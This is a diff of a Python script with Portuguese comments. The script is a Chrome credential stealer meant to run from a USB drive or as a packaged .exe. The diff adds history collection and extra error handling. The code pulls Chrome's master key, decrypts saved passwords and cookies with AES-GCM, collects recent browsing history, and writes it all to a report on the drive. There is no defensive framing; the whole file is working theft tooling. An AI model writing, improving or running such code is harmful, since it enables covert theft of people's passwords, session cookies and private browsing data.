@@ -10,38 +10,32 @@ from Crypto.Cipher import AES
 from datetime import datetime
 
 # ============================================================
-# 1. CRIA A PASTA E O LOG IMEDIATAMENTE (MESMO SE DER ERRO)
+# PASSO 1: DETECTA O PENDRIVE E CRIA A PASTA LÁ
 # ============================================================
-PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))
-PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")
-try:
-    os.makedirs(PASTA_SAIDA, exist_ok=True)
-except:
-    # Fallback: área de trabalho
-    desktop = os.path.join(os.environ.get('USERPROFILE', 'C:/'), 'Desktop')
-    PASTA_SAIDA = os.path.join(desktop, "Credenciais_Backup")
-    os.makedirs(PASTA_SAIDA, exist_ok=True)
+# Se for .exe, pega a pasta onde ele está
+if getattr(sys, 'frozen', False):
+    PASTA_ATUAL = os.path.dirname(sys.executable)
+else:
+    PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))
 
-# ARQUIVO DE LOG (já escreve o início)
+# CRIA A PASTA Credenciais DENTRO DO PENDRIVE (ou da pasta do .exe)
+PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")
+os.makedirs(PASTA_SAIDA, exist_ok=True)
+
+# ARQUIVO DE LOG (dentro da pasta Credenciais)
 LOG_FILE = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
 
 def log(texto):
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(str(texto) + "\n")
-    print(texto)  # também imprime no console (se houver)
-
-log("="*60)
-log("INICIANDO COLETA (VERSÃO ROBUSTA)")
-log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
-log(f"Usuário: {os.getlogin()}")
-log(f"Pasta de saída: {PASTA_SAIDA}")
-log("="*60)
+    print(texto)
 
 # ============================================================
-# 2. FUNÇÕES DE COLETA (COM TRATAMENTO DE ERRO)
+# PASSO 2: FUNÇÕES DE COLETA
 # ============================================================
 def pegar_chave_mestra():
-    path = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Local State"
+    usuario = os.getlogin()
+    path = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Local State"
     if not os.path.exists(path):
         raise FileNotFoundError(f"Chrome não encontrado: {path}")
     with open(path, 'r', encoding='utf-8') as f:
@@ -50,12 +44,18 @@ def pegar_chave_mestra():
     return win32crypt.CryptUnprotectData(chave_enc, None, None, None, 0)[1]
 
 def coletar_senhas(chave):
-    log("  Coletando senhas...")
-    caminho = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
+    log("  [+] Senhas...")
+    usuario = os.getlogin()
+    caminho = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
     if not os.path.exists(caminho):
-        return ["Chrome não possui dados de login."]
+        log("    [!] Chrome sem dados de login.")
+        return []
     temp = os.path.join(PASTA_SAIDA, "temp_senhas.db")
-    shutil.copyfile(caminho, temp)
+    try:
+        shutil.copyfile(caminho, temp)
+    except Exception as e:
+        log(f"    [!] Erro ao copiar: {e}")
+        return []
     creds = []
     conn = sqlite3.connect(temp)
     cursor = conn.cursor()
@@ -68,20 +68,26 @@ def coletar_senhas(chave):
             aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
             senha = aes.decrypt_and_verify(cipher, tag).decode('utf-8')
             creds.append(f"URL: {url}\nUsuário: {user}\nSenha: {senha}\n")
-        except Exception as e:
-            log(f"    Erro ao descriptografar: {e}")
+        except:
+            pass
     conn.close()
     os.remove(temp)
     log(f"    OK {len(creds)} senhas.")
     return creds
 
 def coletar_cookies(chave):
-    log("  Coletando cookies...")
-    caminho = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
+    log("  [+] Cookies...")
+    usuario = os.getlogin()
+    caminho = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
     if not os.path.exists(caminho):
+        log("    [!] Cookies não encontrados.")
         return []
     temp = os.path.join(PASTA_SAIDA, "temp_cookies.db")
-    shutil.copyfile(caminho, temp)
+    try:
+        shutil.copyfile(caminho, temp)
+    except Exception as e:
+        log(f"    [!] Erro ao copiar (Chrome aberto?): {e}")
+        return []
     cookies = []
     conn = sqlite3.connect(temp)
     cursor = conn.cursor()
@@ -101,23 +107,58 @@ def coletar_cookies(chave):
     log(f"    OK {len(cookies)} cookies.")
     return cookies
 
+def coletar_historico():
+    log("  [+] Histórico...")
+    usuario = os.getlogin()
+    caminho = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Default/History"
+    if not os.path.exists(caminho):
+        log("    [!] Histórico não encontrado.")
+        return []
+    temp = os.path.join(PASTA_SAIDA, "temp_history.db")
+    try:
+        shutil.copyfile(caminho, temp)
+    except Exception as e:
+        log(f"    [!] Erro ao copiar: {e}")
+        return []
+    hist = []
+    conn = sqlite3.connect(temp)
+    cursor = conn.cursor()
+    cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")
+    for url, titulo in cursor.fetchall():
+        hist.append(f"URL: {url}\nTítulo: {titulo}\n")
+    conn.close()
+    os.remove(temp)
+    log(f"    OK {len(hist)} sites.")
+    return hist
+
 # ============================================================
-# 3. MAIN (COM CAPTURA DE ERRO GLOBAL)
+# PASSO 3: MAIN – RODA TUDO E SALVA
 # ============================================================
-try:
-    log("\n[+] Obtendo chave...")
-    chave = pegar_chave_mestra()
-    log("[OK] Chave obtida.")
+def main():
+    log("="*60)
+    log("COLETOR COMPLETO (SALVA NO PENDRIVE)")
+    log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
+    log(f"Usuário: {os.getlogin()}")
+    log(f"Pasta de saída: {PASTA_SAIDA}")
+    log("="*60)
+
+    try:
+        chave = pegar_chave_mestra()
+        log("\n[OK] Chave obtida.")
+    except Exception as e:
+        log(f"[ERRO] {e}")
+        return
 
     log("\n[+] Coletando dados...")
     dados = {
         "senhas": coletar_senhas(chave),
-        "cookies": coletar_cookies(chave)
+        "cookies": coletar_cookies(chave),
+        "historico": coletar_historico()
     }
 
-    # Salva relatório
     nome = f"credenciais_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
     caminho = os.path.join(PASTA_SAIDA, nome)
+
     with open(caminho, "w", encoding="utf-8") as f:
         f.write("="*80 + "\n")
         f.write("RELATORIO COMPLETO\n")
@@ -134,23 +175,16 @@ try:
                 f.write("Nenhum dado encontrado.\n")
             f.write("\n")
 
-    # Cópia na raiz do pendrive
     try:
         shutil.copy(caminho, os.path.join(PASTA_ATUAL, nome))
         log(f"\n[OK] Relatório salvo em: {caminho}")
         log(f"[OK] Cópia na raiz do pendrive: {nome}")
     except Exception as e:
-        log(f"[AVISO] Não foi possível copiar para a raiz: {e}")
+        log(f"[AVISO] {e}")
 
-except Exception as e:
-    log(f"[ERRO FATAL] {e}")
-    import traceback
-    log(traceback.format_exc())
-    # Cria um arquivo de erro para diagnóstico
-    with open(os.path.join(PASTA_SAIDA, "erro.txt"), "w") as f:
-        f.write(str(e) + "\n" + traceback.format_exc())
-
-finally:
     log("\n" + "="*60)
     log("FIM DA EXECUÇÃO")
-    time.sleep(2)
+    time.sleep(3)
+
+if __name__ == "__main__":
+    main()
